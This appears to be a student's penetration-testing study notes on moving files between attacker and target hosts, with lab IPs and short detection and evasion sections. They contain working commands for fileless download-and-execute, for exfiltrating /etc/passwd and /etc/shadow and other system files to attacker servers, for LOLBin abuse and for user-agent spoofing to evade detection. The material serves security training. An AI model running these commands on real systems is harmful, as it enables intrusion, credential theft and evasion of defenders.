# File Transfers

This module covers techniques that leverage tools and applications commonly available on Windows and Linux systems. 

# Windows File Transfer Methods

## Introduction

It is essential to understand these techniques for both attackers (delivering payloads, exfiltrating data) and defenders (detecting/blocking these channels). 

The Astaroth APT attack is used as an introductory example, illustrating a real-world chain: spear-phishing -> LNK file -> WMIC -> Bitsadmin -> Certutil -> Regsvr32 -> fileless injection.

The key takeway is: multiple transfer methods can be chained together to evade defenses.

## Download Operations (Attack Host -> Windows Target)

### 1. Powershell - Base64 Encode/Decode

Use when you **can't establish a direct network connection**. Transfer happens by copy-pasting text.

#### On Linux (encode)

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

#### On Windows (decode)

```bash
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_STRING>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5   # verify integrity
```

> Limit: cmd.exe has a max string length of 8,191 characters — not suitable for large files.

### 2. PowerShell - Web Downloads (`Net.WebClient`)


| Method                 | Command                                                        | Notes                                         |
| ---------------------- | -------------------------------------------------------------- | --------------------------------------------- |
| `DownloadFile`         | `(New-Object Net.WebClient).DownloadFile('<URL>', '<output>')` | Writes to disk                                |
| `DownloadFileAsync`    | Same with `Async` suffix                                       | Non-blocking                                  |
| `DownloadString`+`IEX` | `IEX (New-Object Net.WebClient).DownloadString('<URL>')`       | Fileless - runs in memory, never touches disk |
| `Invoke-WebRequest`    | `Invoke-WebRequest <URL> -OutFile <file>`                      | Slower; aliases: `iwr`, `curl`, `wget`        |


#### Common errors and fixes


| Error                          | Fix                                                                               |
| ------------------------------ | --------------------------------------------------------------------------------- |
| IE first-launch not configured | Add `-UseBasicParsing` flag                                                       |
| Untrusted SSL/TLS certificate  | `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}` |


### 3. SMB Downloads (`impacket-smbserver`)

#### On Linux (set up share)

```bash
# Anonymous
sudo impacket-smbserver share -smb2support /tmp/smbshare

# With credentials (required on newer Windows)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

#### On Windoes (copy file)

```bash
copy \\192.168.220.133\share\nc.exe

:: With credentials
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

> Newer Windows versions block unauthenticated guest access - always use credentials as a fallback.

### 4. FTP Downloads (`pyftpdlib`)

#### On Linux

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

#### On Windows

```bash
# Via PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

#### Not-interactive shell (command file method)

```bash
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## Upload Operations (Windows Target -> Attack Host)

### 1. PowerShell - Base64 Encode/Decode (reverse direction)

#### On Windows (encode)

```bash
[Convert]::ToBase64String((Get-Content -Path 'C:\Windows\system32\drivers\etc\hosts' -Encoding Byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

#### On Linux (decode and verify)

```bash
echo <BASE64> | base64 -d > hosts
md5sum hosts
```

### 2. PowerShell - Web Uploads (`uploadserver`)

#### On Linux

```bash
pip3 install uploadserver
python3 -m uploadserver     # listens on port 8000
```

#### On Windows (using PSUpload.ps1)

```bash
IEX(New-Object Net.WebClient).DownloadString('https://.../PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

#### Alternative - Base64 over HTTP POST + Netcat

```bash
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\...\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000
# then:
echo <base64> | base64 -d -w 0 > hosts
```

### 3. SMB Uploads (WebDAV)

Used whtn TCP/445 is blocked outbound (common in enterprise). WebDAV tunnels SMB over HTTP/HTTPS.

#### On Linux

```bash
sudo pip3 install wsfidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

#### On Windows

```bash
:: Browse WebDAV share
dir \\192.168.49.128\DavWWWRoot

:: Upload file
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\
```

> DavWWWRoot is a special Windows keyword that points to the root of a WebDAV server — it's not a real folder on the server.

### 4. FTP Uploads (`pyftpdlib --write`)

#### On Linux

```bash
sudo python3 -m pyftpdlib --port 21 --write   # --write flag is required for uploads
```

#### On Windows

```bash
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### Non-interactive shell (command file)

```bash
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## Key Concepts to Internalize


| Concept                                       | Why It Matters                                                    |
| --------------------------------------------- | ----------------------------------------------------------------- |
| Fileless execution (`IEX` + `DownloadString`) | Payload runs in memory, never written to disk, evades AV/EDR      |
| MD5 hash verification                         | Always confirm file integrity after transfer                      |
| Base64 encoding                               | Transfer binary files as text when no direct channel is available |
| WebDAV over HTTP                              | Bypasses SMB outbound blocks in enterprise environments           |
| Non-interactive FTP                           | Critical for shells without an interactive prompt                 |
| `--write` flag in pyftpdlib                   | Required to allow uploads, easy to forget                         |
| Credential requirement on modern Windows      | Anonymous SMB is blocked by default on recent builds              |


## Method 1 - SMB

### Linux -> Windows (download from share)

#### Ubuntu

```bash
mkdir -p /tmp/smbshare
cp /tmp/smb_linux_to_windows.txt /tmp/smbshare/
sudo ../venv/bin/python3 ~/impacket/examples/smbserver.py share -smb2support /tmp/smbshare -user test -password test
```

#### Windows

```bash
net use n: \\10.10.14.171\share /user:test test
copy n:\smb_linux_to_windows.txt C:\Users\htb-student\Desktop\
```

### Windows -> Linux (upload to share)

#### Windows

```
echo "transferred via SMB windows to linux" > C:\Users\htb-student\Desktop\smb_windows_to_linux.txt
copy C:\Users\htb-student\Desktop\smb_windows_to_linux.txt n:\
```

#### Ubuntu (verify)

```bash
cat /tmp/smbshare/smb_windows_to_linux.txt
```

## Method 2 - FTP

### Linux -> Windows (download from FTP)

#### Ubuntu

```bash
echo "transferred via FTP linux to windows" > /tmp/ftp_linux_to_windows.txt
sudo venv/bin/python3 -m pyftpdlib --port 21 --write
```

#### Windows

```bash
(New-Object Net.WebClient).UploadFile('ftp://10.10.14.171/ftp_windows_to_linux.txt', 'C:\Users\htb-student\Desktop\smb_windows_to_linux.txt')
```

#### Ubuntu (verify)

```bash
cat ~/ftp_windows_to_linux.txt
```

## Method 3 - HTTP (PowerShell Web Download)

### Linux -> Windows (download via HTTP)

#### Ubuntu

```bash
echo "transferred via HTTP linux to windows" > /tmp/http_linux_to_windows.txt
cd /tmp && python3 -m http.server 8080
```

#### Windows

```bash
# Write to disk
(New-Object Net.WebClient).DownloadFile('http://10.10.14.171:8080/http_linux_to_windows.txt', 'C:\Users\htb-student\Desktop\http_linux_to_windows.txt')

# Fileless (runs in memory)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.171:8080/http_linux_to_windows.txt')
```

### Windows -> Linux (upload via HTTP POST)

#### Ubuntu

```bash
nc -lvnp 8000
```

#### Windows

```bash
# PowerShell
echo "transferred via HTTP windows to linux" > C:\Users\htb-student\Desktop\smb_windows_to_linux.txt

$content = Get-Content 'C:\Users\htb-student\Desktop\smb_windows_to_linux.txt'
$b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
Invoke-WebRequest -Uri http://10.10.14.171:8000/ -Method POST -Body $b64
```

#### Ubuntu

```bash
echo "<BASE64_OUTPUT>" | base64 -d -w 0 > ~/http_windows_to_linux.txt
cat ~/http_windows_to_linux.txt
```

## Method 4 - Base64 (no network channel needed)

### Linux -> Windows

#### Ubuntu

```bash
cat base64_linux_to_windows.txt | base64 -w 0; echo
# Copy the output
# YmFzZTY0X2xpbnV4X3RvX3dpbmRvd3MK
```

#### Windows

```bash
[IO.File]::WriteAllBytes("C:\Users\htb-student\Desktop\base64_linux_to_windows.txt", [Convert]::FromBase64String("<PASTE_BASE64_HERE>"))
# Verify
Get-FileHash C:\Users\htb-student\Desktop\base64_linux_to_windows.txt -Algorithm MD5
```

### Windows -> Linux

#### Windows

```bash
[Convert]::ToBase64String((Get-Content -Path 'C:\Users\htb-student\Desktop\base64_windows_to_linux.txt' -Encoding Byte))
# Copy the output
# YmFzZTY0X3dpbmRvd3NfdG9fbGludXg=
```

#### Ubuntu

```bash
echo "<PASTE_BASE64_HERE>" | base64 -d > ~/base64_windows_to_linux.txt
cat ~/base64_windows_to_linux.txt
```

# Linux File Transfer Methods

## Overview

Linux has many built-in tools for file transfers. Most malware on Linux uses HTTP/HTTPS for communication (as opposed to SMB/FTP). The section opens with a real incident response case where a threat actor's bash script tried curl -> wget -> Python in sequence as fallback download methods.

## Download Operations (Attack Host -> Linux Target)

### 1. Base64 Encode/Decode

Same concept as Windows - useful when no direct network channel is available.

#### On attack host (encode)

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

#### On target (decode)

```bash
echo -d '<BASE64>' | base64 -d > id_rsa
md5sum id_rsa # verify integrity
```

### 2. wget and cURL

Most common Linux download tools.

```bash
# wget 
wget https://URL/LinEnum.sh -O /tmp/LinEnum.sh

# cURL (-o lowercase)
curl -o /tmp/LinEnum.sh http://<URL>/LinEnum.sh
```

### 3. Fileless Downloads (pipe directly into execution)

No file written to disk - evades AV/EDR.

```bash
# cURL
curl https://<URL>/LinEnum.sh | bash

# wget fileless
wget -q0- https://<URL>/helloworld.py | python3
```

> Some payloads like `mkfifo` may still create temporary files on disk even when piped.

### 4. Download with Bash `/dev/tcp`

Used when no tools are available - pure bash, no wget/curl needed. Requires Bash >= 2.04.

```bash
# Open TCP connection
exec 3<>/dev/tcp/10.10.10.32/80

# Send HTTP GET request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

# Print response
cat <&3
```

### 5. SCP (SSH Downloads)

Requires SSH server running on attack host.

#### On attack host

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt   # confirm port 22 is listening
```

#### On target (download from attack host)

```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

## Upload Operations (Linux Target -> Attack Host)

### 1. Web Upload (uploadserver + HTTPS)

More secure version using a self-signed certificate.

#### On attack host

```bash
# Install uploadserver
source venv/bin/activate
python3 -m pip install uploadserver

# Create self-signed certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start HTTPS upload server
mkdir https && cd https
sudo ../venv/bin/python3 -m uploadserver 443 --server-certificate ~/server.pem
```

#### On target (upload files)

```bash
curl -X POST https://192.168.49.128/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow' \
  --insecure   # needed for self-signed cert
```

### 2. Alternative - Mini Web Server on Target

Start a web server on the target and pull files from the attack host.

```bash
# Python3
python3 -m http.server

# Python2.7
python2.7 -m SimpleHTTPServer

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000
```

#### On attack gost (pull the file)

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

### 3. SCP Upload

```bash
scp /etc/passwd htb-student@10.129.86.90_/home/htb-student/
```

## Key Concepts


| Concept                                 | Why It Matters                                                                 |
| --------------------------------------- | ------------------------------------------------------------------------------ |
| **curl → wget → Python fallback chain** | Real malware uses this pattern — know how to detect and block it               |
| **Fileless execution via pipe**         | No artifact left on disk — harder to detect                                    |
| `/dev/tcp` **in bash**                  | Transfer files with zero external tools — critical for restricted environments |
| **SCP**                                 | Clean, encrypted transfer when SSH is available                                |
| `--insecure` **flag in curl**           | Required when using self-signed certs                                          |
| **Mini web servers**                    | Quick exfiltration from a compromised host with no upload tools                |
| **MD5 verification**                    | Always verify file integrity after transfer                                    |


## Connect to HTB

```bash
wget "http://10.129.234.168/flag.txt"
cat flag.txt
5d21cf3da9c0ccb94f709e2559f3ea50

python3 -m http.server
ssh htb-student@10.129.234.168
wget http://10.10.14.171/Desktop/upload_nix.zip
python3 -c "import zipfile; zipfile.ZipFile('upload_nix.zip').extractall('.')"
hasher upload_nix.txt
159cfe5c65054bbadb2761cfa359c8b0
```

# Transferring Files with Code

## Overview

Programming languages installed on target machines can be leveraged for file transfers. Key languages covered: Python, PHP, Ruby, Perl (cross-platform), and JavaScript/VBScript (Windows-specific via `cscript.exe`).

## Python

```bash
# Python 2.7
python2.7 -c 'import urllib;urllib.urlretrieve("https://<URL>/file.sh", "file.sh")'

# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://<URL>/file.sh", "file.sh")'
```

### Upload with Python3 (requests module)

#### On attack host

```bash
python3 -m uploadserver
```

#### On target

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## PHP

```bash
# Method 1 - file_get_contents() + file_put_contents()
php -r '$file = file_get_contents("https://<URL>/file.sh"); file_put_contents("file.sh",$file);'

# Method 2 - fopen() (buffered, better for large files)
php -r 'const BUFFER = 1024; $fremote = fopen("https://<URL>/file.sh", "rb"); $flocal = fopen("file.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Method 3 - Fileless (pipe to bash)
php -r '$lines = @file("https://<URL>/file.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Ruby and Perl

```bash
# Ruby
ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("https://<URL>/file.sh")))'

# Perl
perl -e 'use LWP::Simple; getstore("https://<URL>/file.sh", "file.sh");'
```

## JavaScript + VBSript (Windows only)

Both require creating a script file and running it with cscript.exe.

### KavaScript (`wget.js`)

```bash
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```bash
cscript.exe /nologo wget.js https://<URL>/PowerView.ps1 PowerView.ps1
```

#### VBScript (`wget.vbs`)

```bash
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```bash
cscript.exe /nologo wget.vbs https://<URL>/PowerView.ps1 PowerView2.ps1
```

### Key Concepts to Internalize


| Concept                               | Why It Matters                                                                          |
| ------------------------------------- | --------------------------------------------------------------------------------------- |
| `-c` **flag**                         | Runs a one-liner directly from CLI in Python, PHP, Ruby, Perl — no script file needed   |
| **Python** `requests.post()`          | Clean way to upload files to `uploadserver` from a compromised Linux host               |
| **PHP** `fopen()` **buffered method** | Better for large files than `file_get_contents()`                                       |
| **PHP fileless pipe to bash**         | Execute remote scripts without writing to disk                                          |
| **JS/VBS +** `cscript.exe`            | Useful on Windows when PowerShell is restricted or monitored                            |
| **Language availability**             | Always check what's installed: `which python3`, `which php`, `which ruby`, `which perl` |


# Miscellaneous File Transfer Methods

## Overview

Covers alternative transfer methods when HTTP/HTTPS/SMB are unavailabe:Netcat/Ncat, PowerShell Remoting (WinRM), and RDP drive mounting.

## Netcat/Ncat

Two directions are possible: target listens and receives, or attack host listens and sends.

### Method 1 - Target Listens, Attack Host Sends

#### Target (receiving)

```bash
# Netcat
nc -l -p 8000 > SharpKatz.exe

# Ncat
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

#### Attack host (sending)

```bash
# Netcat
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# Ncat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

### Method 2 - Attack Host Listens, Target Connects (bypasses inbond firewall rules)

#### Attack host (listening/sending)

```bash
# Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Target (connecting/receiving)

```bash
# Netcat
nc 192.168.49.128 443 > SharpKatz.exe

# Ncat
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

# No netcat available — use /dev/tcp
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## Flag Reference


| Flag          | Tool    | Purpose                                  |
| ------------- | ------- | ---------------------------------------- |
| `-l`          | nc      | Listen mode                              |
| `-p`          | nc/ncat | Specify port                             |
| `-q 0`        | nc      | Close connection when done               |
| `--send-only` | ncat    | Close when input exhausted (sender side) |
| `--recv-only` | ncat    | Close when transfer done (receiver side) |


## PowerShell Remoting (WinRM)

Used when HTTP/HTTPS/SMB are blocked. Requires admin rights or Remote Management Users group membership. Runs on TCP/5985 (HTTP) and TCP/5986 (HTTPS).

### Verify WinRM connectivity

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

### Create session

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

### Copy files

```powershell
# Local → Remote
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Remote → Local
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP File Transfer

### Copy-Paste

Simplest method - right-click copy on the remote machine, paste locally (or vice versa). May not always work.

### Mount Local Folder into RDP Session

```bash
# rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

# xfreerdp
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

Access the mounted folder from Windows at:

```bash
\\tsclient\linux
```

> If the shared folder contains malware samples, Windows Defender may delete them from your local machine.

### Key Concepts to Internalize


| Concept                                     | Why It Matters                                                                |
| ------------------------------------------- | ----------------------------------------------------------------------------- |
| `/dev/tcp` **fallback**                     | Transfer files with pure bash when nc/ncat aren't available                   |
| **Reverse direction (attack host listens)** | Bypasses firewalls that block inbound connections to the target               |
| `-q 0` **/** `--send-only`                  | Without these, nc/ncat may hang after transfer completes                      |
| **WinRM file transfer**                     | Useful when all common protocols are blocked but WinRM is enabled for admin   |
| **RDP drive mount**                         | Clean method to drag-and-drop files in an RDP session without any extra tools |
| `\\tsclient\`                               | Special UNC path to access locally mounted drives inside an RDP session       |


# Protected File Transfers

## Overview

During pentests you often handle highly sensitive data (credentials, NTDS.dit, AD enumeration results, etc.). Encrypting files before transfer is critical to avoid data leakage if traffic is intercepted.

> Important ethical note: Never exfiltrate real PII, financial data, or trade secrets from a client environment. Use dummy data when testing DLP controls instead.

## File Encryption on Windows - `Invoke-AESEncryption.ps1`

Uses AES-256 encryption. Transfer the script to the target first, then import it.

### Import the module

```powershell
Import-Module .\Invoke-AESEncryption.ps1
```

### Encrypt a file

```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
# Output: scan-results.txt.aes
```

### Decrypt a file

```powershell
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes
```

### Encrypt a string

```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
# Output: Base64 encoded ciphertext
```

### Decrypt a string

```powershell
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
```

## File Encryption on Linux - `openssl`

OpenSSL is pre-installed on most Linux distributions.

### Encrypt a file

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

### Decrypt a file

```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

## Flag breakdown


| Flag           | Purpose                                                 |
| -------------- | ------------------------------------------------------- |
| `enc`          | Encryption/decryption mode                              |
| `-aes256`      | AES-256-CBC cipher                                      |
| `-iter 100000` | Increases iteration count — hardens against brute force |
| `-pbkdf2`      | Uses PBKDF2 key derivation — stronger than default      |
| `-in`          | Input file                                              |
| `-out`         | Output file                                             |
| `-d`           | Decrypt mode                                            |


## Key Concepts to Internalize


| Concept                                 | Why It Matters                                                                 |
| --------------------------------------- | ------------------------------------------------------------------------------ |
| **Always encrypt before transferring**  | Intercepted traffic won't expose sensitive data                                |
| **Use unique passwords per client**     | Prevents one leaked password from compromising all engagements                 |
| `-pbkdf2` **+** `-iter 100000`          | Hardens encryption against brute-force — always use these flags                |
| **Prefer HTTPS/SFTP/SSH for transport** | Encryption at rest (openssl) + encryption in transit = double protection       |
| `.aes` **extension**                    | Output convention of `Invoke-AESEncryption` — easy to identify encrypted files |


# Catching Files over HTTP/S

## Overview

HTTP/HTTPS are the most commonly allowed protocols through firewalls, making them ideal for file transfers during pentests. This section covers setting up Nginx as a secure upload server using the PUT method.

> Why Nginx over Apache? Apache's PHP module will execute any `.php` file uploaded, creating a web shell risk. Nginx doesn't have this problem - PHP execution requires significant extra configuration.

## Nginx Setup for File Uploads (PUT method)

### Full Setup Sequence

#### 1. Create upload directory

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

#### 2. Set correct ownership

```bash
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

#### 3. Create Nginx config

```bash
# /etc/nginx/sites-available/upload.conf
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

#### 4. Enable the site

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

#### 5. Start Nginx

```bash
sudo systemctl restart nginx.service
```

## Troubleshooting - Port Already in Use

If port 80 is taken (common on Pwnbox)

```bash
# Check error log
tail -2 /var/log/nginx/error.log

# Find what's using port 80
ss -lnpt | grep 80

# Remove default Nginx config that binds to port 80
sudo rm /etc/nginx/sites-enabled/default

# Restart
sudo systemctl restart nginx.service
```

### Upload a File via cURL (PUT request)

```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

### Verify the upload

```bash
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

### Key Concepts to Internalize


| Concept                                            | Why It Matters                                               |
| -------------------------------------------------- | ------------------------------------------------------------ |
| **HTTP/HTTPS preferred**                           | Most firewalls allow these — highest chance of success       |
| **Nginx over Apache for uploads**                  | Apache + PHP = accidental web shell execution risk           |
| `dav_methods PUT`                                  | Enables HTTP PUT uploads in Nginx — not enabled by default   |
| `www-data` **ownership**                           | Nginx runs as `www-data` — directory must be writable by it  |
| **Directory listing disabled by default in Nginx** | Uploaded sensitive files aren't exposed via browser browsing |
| **Use port != 80**                                 | Avoids conflicts with existing services on common ports      |
| `curl -T`                                          | Clean way to send a PUT request to upload a file             |


# Living off the Land

## Overview

LOLBins (Living off the Land Binaries) are legitimate system binaries repurposed by attackers to perform actions beyond their original intent - downloads, uploads, execution, file read/write, and bypasses. No need to bring external tools.

Key sources:

- Windows: LOLBAS Project - search `/download` or `/upload`

```bash
https://lolbas-project.github.io/
```

- Linux: GTFOBins - search `+file download` or `+file upload`

## Windows LOLBins

### 1. CertReq.exe - Upload

Sends a file via HTTP POST to a listening Netcat on the attack host.

#### Attack host

```bash
sudo nc -lvnp 8000
```

#### Windows target

```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

> Older versions may not have `-Post`- download an updated version if needed.

### 2. Bitsadmin - Download

Uses the Background Intelligent Transfer Service (BITS) - a legitimate Windows service that minimizes bandwidth impact

```bash
python3 -m http.server 8000
```

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

#### Via PowerShell

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### 3. Certutil - Download

Known as the "defacto wget for Windows". Available on all Windows versions.

```cmd
certutil.exe -urlcache -split -f http://10.10.14.171:8000/hash.txt C:\Users\htb-student\Desktop\hash.txt
```

> AMSI currently flags this as malicious - likely to trigger AV/EDR on modern systems.

## Linux GTFOBins

### OpenSSL - Download/Upload ("nc style")

OpenSSL is almost always available and can act like netcat for encrypted file transfers.

#### Attack host - create cert and start server

```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Start server serving a file
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

#### Compromised machine - download file

```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Key Concepts to Internalize


| Concept                          | Why It Matters                                                                    |
| -------------------------------- | --------------------------------------------------------------------------------- |
| **LOLBins blend in**             | Using native binaries avoids triggering AV/EDR that flags unknown executables     |
| **LOLBAS + GTFOBins**            | Always check these before bringing external tools — a native binary is stealthier |
| **Certutil is flagged by AMSI**  | Popular = detected; use less common LOLBins when evasion matters                  |
| **BITS is "intelligent"**        | Throttles bandwidth to avoid detection by anomaly-based monitoring                |
| **OpenSSL transfer = encrypted** | Unlike plain netcat, OpenSSL transfers are TLS-encrypted                          |
| `certreq -Post`                  | Abuses certificate request functionality to exfiltrate data via HTTP POST         |


# Detection

## Overview

This section covers how defenders detect malicious file transfers, focusing on two main detection vectors: command-line monitoring and HTTP user agent strings.

## Detection Method 1 - Command-Line Monitoring

- Blacklisting specific commands is easy to bypass (even simple case obfuscation breaks it)
- Whitelisting is harder to set up initially but much more robust - anything not on the whitelist triggers an alert.

## Detection Method 2 - HTTP User Agent Strings

Every HTTP client identifies itself with a User-Agent header. Defenders can build a list of known legitimate user agents and feed anomalies into a SIEM for threat hunting.

### User Agents by Transfer Method


| Method                                    | User Agent String                                                                |
| ----------------------------------------- | -------------------------------------------------------------------------------- |
| `Invoke-WebRequest` / `Invoke-RestMethod` | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0` |
| `WinHttpRequest`                          | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)`                      |
| `Msxml2.XMLHTTP`                          | `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0)`   |
| `certutil`                                | `Microsoft-CryptoAPI/10.0`                                                       |
| `BITS`                                    | `Microsoft BITS/7.8`                                                             |


#### Client Commands Reference

```powershell
# Invoke-WebRequest
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"

# WinHttpRequest
$h=new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.ResponseText

# Msxml2
$h=New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.responseText

# Certutil
certutil -urlcache -split -f http://10.10.10.32/nc.exe
certutil -verifyctl -split -f http://10.10.10.32/nc.exe

# BITS
Import-Module bitstransfer;
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
$r=gc $env:temp\t;
rm $env:temp\t;
iex $r
```

## Key Concepts to Internalize


| Concept                                         | Why It Matters                                                                         |
| ----------------------------------------------- | -------------------------------------------------------------------------------------- |
| **User agents are fingerprints**                | Each tool leaves a distinct signature — defenders use these to detect attacks          |
| **Blacklisting is weak**                        | Simple obfuscation (case changes, aliases) bypasses it trivially                       |
| **Whitelisting is strong**                      | Anything not explicitly allowed triggers an alert — much harder to evade               |
| **SIEM + user agent hunting**                   | Correlating anomalous user agents across logs reveals attacks in progress              |
| `Microsoft BITS/7.8`                            | BITS stands out — legitimate BITS traffic usually goes to Microsoft, not random IPs    |
| `Microsoft-CryptoAPI/10.0`                      | Certutil connecting to non-Microsoft URLs is highly suspicious to defenders            |
| **Fileless techniques still leave user agents** | Even in-memory execution via `iex` still generates HTTP logs with identifiable headers |


# Evading Detection

## Overview

When defenders have blacklisted common tools or user agents, two main evasion strategies exist: spoofing user agent strings and using obscure LOLBins that bypass application whitelisting.

## Strategy 1 - Changing User Agent in PowerShell

`Invoke-WebRequest` has a built-in `-UserAgent` parameter to impersonate browsers.

### List available user agents

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Available options: `InternetExplorer`, `Firefox`, `Chrome`, `Opera`, `Safari`

### Download using Chrome user agent

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

The server sees:

```
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
```

> Match the user agent to whatever browser is commonly used internally - Chrome traffic blends in on most corporate networks.

## Strategy 2 - Obscure LOL Bins

